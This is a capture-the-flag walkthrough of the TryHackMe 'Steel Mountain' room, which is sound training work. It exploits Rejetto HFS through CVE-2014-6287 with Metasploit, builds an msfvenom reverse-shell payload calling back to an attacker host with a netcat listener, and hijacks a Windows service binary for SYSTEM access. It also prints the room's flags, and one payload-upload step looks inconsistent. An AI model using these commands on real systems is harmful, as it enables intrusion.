# <div align='center'>[Steel Mountain](https://tryhackme.com/room/steelmountain)</div>
<div align='center'>Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.</div>
<div align='center'>
  <img src='https://github.com/user-attachments/assets/771d82ac-78ff-4d34-b7ba-b4498f3b75ed' height='200'></img>
</div>

## Task 1. Introduction

<div align='center'>
  <img src='https://github.com/user-attachments/assets/ae28e5b6-6b2f-42e7-a3ca-aebbb75d12c3' height='200'></img>
</div>



In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

Answer the questions below

### Who is the employee of the month?
```
BillHarper
```
## Task 2. Initial Access
Now you have deployed the machine, lets get an initial shell!

Answer the questions below
### Scan the machine with nmap. What is the other port running a web server on?
```
8080
```
### Take a look at the other web server. What file server is running?
```
Rejetto HTTP File Server 
```
### What is the CVE number to exploit this file server?
```
2014-6287
```
### Use Metasploit to get an initial shell. What is the user flag?

```
b047***************d365
```

## Task 3. Privilege Escalation

Step 1. Recconnace

Scanning the network by nmap
```bash
root@ip-10-10-150-151:~# nmap 10.10.193.112 -sV -sC -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-02 07:17 BST
Nmap scan report for 10.10.193.112
Host is up (0.00068s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-06-02T06:18:50+00:00; 0s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:7A:88:EB:65:B1 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:7a:88:eb:65:b1 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-02T06:18:45
|_  start_date: 2025-06-02T06:07:49

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

As thge http service is ruuning on port 80 let nevigate to web.

On the web page there is picture of employ of the month , as we inspect the source code the employ name is mention on the image name.

![image](https://github.com/user-attachments/assets/300364cc-57b6-43b4-b06d-b6358ed67a01)


When we look at the other web server. there is a file server is runningon port `8080`

![image](https://github.com/user-attachments/assets/f8cf1b53-7ce4-4238-b471-9a5973463697)


The scan revils that the file server version is ` HttpFileServer httpd 2.3` , as i search this on web i found an existing vulnerbility

![image](https://github.com/user-attachments/assets/bd30e243-c115-4ca7-a6ba-ad5013b23b4a)

The server verion is outdated, here is [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287) prensent in it. tHE CVE represent its an RCE vulnerability.

![image](https://github.com/user-attachments/assets/eb2db4c3-edce-4d47-b89a-626fec469bc2)

As we saw on previous image uploded above the `Rejetto HTTP File Server` can be exploit by Metasploit becouse the payload is avilable on exploit db.

Step 2. Exploitation
Let use metasploit exploit this vulnerbaility

Let open the Metasploit by running command on terminal:
```
msfconsole -q
```
Search for Cve 
```
search CVE-2014-6287
```
![image](https://github.com/user-attachments/assets/d3dbcfe3-2c02-4efb-861c-612c5163a13f)

Use this exploit
```
use 0
```

Let see the option
```
show options
```
![image](https://github.com/user-attachments/assets/8b245679-2d53-4de0-a89a-f52ac46987a3)

Set RHOST 
```
set RHOST <IP>
```
Set LHOST
```
set LHOST <Ip>
```
Set RPORT
```
set RPORT 8080
```

Let exploit by typing 
```
exploit
```
Awsome we got the meterpreter shell

## User flag

the user flag is in Desktop foler

![image](https://github.com/user-attachments/assets/7b36b7ca-5fa3-4671-8fef-81a1d0a936f7)

<!--
b04763b6fcf51fcd7c13abc7db4fd365
-->

Step 3. Privillage Esclation.
Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!



To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."



To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the upload command in Metasploit to upload the script.

Download the scrit in your system:
```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```
let upload this script 
```
upload PowerUp.ps1
```
![image](https://github.com/user-attachments/assets/7e4b2e0c-1e65-40e9-b89a-9e590ad3ef34)

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:
```
meterpreter > load powershell
meterpreter > powershell_shell
```
![image](https://github.com/user-attachments/assets/410527e1-1e5c-483a-bf03-4cda1dafeb19)

Run this script in powershell :
```ps
PS > . .\PowerUp.ps1
PS > Invoke-Allchecks
```

We got this:
```
PS > . .\PowerUp.ps1
PS > Invoke-Allchecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files


PS > Name           : AdvancedSystemCareService9

```

Now as we found our service we will now generate a payload for exploiting our target using msfvenom on our machine and then uploading it to our target.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.86.191 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

![image](https://github.com/user-attachments/assets/3651fca9-95ac-49c2-98ed-06d0b8fbb205)

Swape Shell form meterpreter
```
shell
```
![image](https://github.com/user-attachments/assets/c7e8cb31-592e-47bd-b124-41cd19ab36a0)

Stop the service:
```
sc stop AdvancedSystemCareService9
```
press ctrl+C to exit the process
```
ctrl + c
```
Now upload the created payload, the path above is the path of the service and we are replacing it with our malicious payload (always check the path of the file to be same as your metasploit path in which it is running)
```
upload Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\Advanced.exe"
```
Let’s start a Netcat listener in another tab of our terminal

```
nc -lvnp 4443
```
Let’s move back to the shell and start our service again and here comes the juice 
```
meterpreter > shell
C:\Users\bill\Desktop> sc start AdvancedSystemCareService9
```


## Root flag
```
9af5f314f57607c00fd09803a587db80
```
